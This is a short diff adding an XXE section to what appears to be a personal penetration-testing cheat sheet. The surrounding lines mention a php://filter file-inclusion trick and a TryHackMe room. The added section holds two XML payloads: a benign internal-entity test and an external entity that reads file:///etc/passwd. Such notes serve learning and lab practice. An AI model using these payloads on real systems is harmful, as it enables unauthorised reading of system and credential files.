@@ -77,3 +77,19 @@ php://filter/convert.base64-encode/resource=post.php
 
 - For nice file path targets see this [TryHackMe](https://tryhackme.com/room/fileinc) room.
 - Go for remote file inclusions.
+
+## XXE
+Two payloads you can try are listed below.
+
+```xml
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ <userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>
+```
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
